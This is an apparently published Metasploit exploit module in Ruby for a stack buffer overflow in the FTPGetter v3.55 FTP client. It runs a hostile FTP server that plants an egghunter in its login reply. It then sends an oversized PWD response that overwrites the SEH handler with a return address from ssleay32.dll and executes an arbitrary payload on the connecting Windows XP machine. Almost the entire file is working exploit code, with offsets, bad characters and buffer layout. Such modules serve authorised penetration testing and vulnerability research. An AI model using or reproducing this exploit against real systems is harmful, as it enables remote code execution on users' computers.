##
# $Id: ftpgetter_pwd_reply.rb 11039 2010-11-14 19:03:24Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::FtpServer
	include Msf::Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'FTPGetter Standard v3.55.0.05 Stack Buffer Overflow (PWD)',
			'Description'    => %q{
					This module exploits a buffer overflow in FTPGetter Standard v3.55.0.05 ftp client.
				When processing the response on a PWD command, a stack based buffer overflow occurs.
				This leads to arbitrary code execution when a structured exception handler gets
				overwritten.
			},
			'Author' 	 =>
				[
					'ekse',	# found the bug
					'corelanc0d3r',	#  wrote the exploit
				],
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 11039 $",
			'References'     =>
				[
					[ 'OSVDB', '68638'],
					[ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'BadChars' => "\x00\xff\x0d\x5c\x2f\x0a",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'XP SP3 Universal', { 'Offset' => 485, 'Ret' => 0x100139E5  } ],  # ppr [ssleay32.dll]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Oct 12 2010',
			'DefaultTarget'  => 0))

	end

	def setup
		super
		badchars = ""
		eggoptions =
		{
		:checksum => true,
		:eggtag => "W00T"
		}
		@hunter,@egg = generate_egghunter(payload.encoded,badchars,eggoptions)
	end

	def on_client_unknown_command(c,cmd,arg)
		c.put("200 OK\r\n")
	end

	def on_client_command_pass(c,arg)
		@state[c][:pass] = arg
		c.put("230 OK #{@egg}\r\n")
		return
	end

	def on_client_command_pwd(c,arg)
		junk1 = "A" * target['Offset']
		junk2 = "A" * 9
		nseh = "\x74\x06\x41\x41"
		jmp = "\x75\x08"
		seh = [target.ret].pack('V')
		junk3 = "D" * 22000
		#dual offset
		buffer = junk1 + nseh + seh + junk2 + jmp + nseh + seh + @hunter + junk3
		c.put("257 \"/\" #{buffer}\r\n")
		print_status("Sent payload, #{buffer.length} bytes")
		print_status("Wait for hunter ...")
		return
	end

end

